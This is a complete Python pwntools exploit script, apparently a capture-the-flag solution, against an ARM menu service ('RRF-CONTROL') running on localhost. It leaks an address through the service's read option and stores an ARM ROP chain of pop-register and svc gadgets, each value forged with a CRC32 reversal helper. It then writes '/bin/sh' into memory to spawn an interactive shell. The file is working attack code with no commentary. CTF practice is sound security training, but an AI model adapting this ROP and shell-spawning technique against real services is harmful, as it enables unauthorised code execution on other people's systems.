from pwn import *
import subprocess

def reverse(addr):
    content = subprocess.check_output(['python', 'crc32/crc32.py', 'reverse', hex(addr)])
    line = content.splitlines()[2]
    return line.split()[1]
def reverse_all(rop):
    return [reverse(x) for x in rop]

main = 0x00010BC0
pr0 = 0x0006ef8c# : pop {r0, pc}
pr7 = 0x0001a194# : pop {r7, pc}
svc = 0x0004e8a8# : svc #0 ; pop {r7} ; bx lr
gadget = 0x0006e808# : pop {r1, r2, lr} ; mul r3, r2, r0 ; sub r1, r1, r3 ; bx lr
buf = 0x9951c
r = remote('127.0.0.1', 5555)
def read_data(idx):
    r.sendlineafter(' #123@RRF-CONTROL> ', '2')
    r.sendlineafter('Select slot to read from: ', str(idx))
    r.recvuntil('Read ')
    return int(r.recv(8), 16)
def store_data(contents):
    r.sendlineafter(' #123@RRF-CONTROL> ', '1')

    for i in range(len(contents)):
        idx = 14+i
        content = contents[i]
        r.sendlineafter('Select storage slot: ', str(idx))
        r.sendlineafter('Data for storage: ', content)

        if i == len(contents)-1:
            pass
            #r.sendlineafter('Store more? (y/n): ', 'n')
        else:
            r.sendlineafter('Store more? (y/n): ', 'y')
    

r.sendlineafter('Login: ', '123')
target = read_data(11)-0x10
log.info('target addr: %#x' % target)
rop = []
rop += [pr0, buf]
rop += [pr7, 0xb]
rop += [gadget, 0, 0, svc]
store_data(reverse_all(rop))
r.sendlineafter('Store more? (y/n): ', 'y')
r.sendlineafter('Select storage slot: ', '0')
r.sendlineafter('Data for storage: ', '/bin/sh\x00\n')


r.interactive()
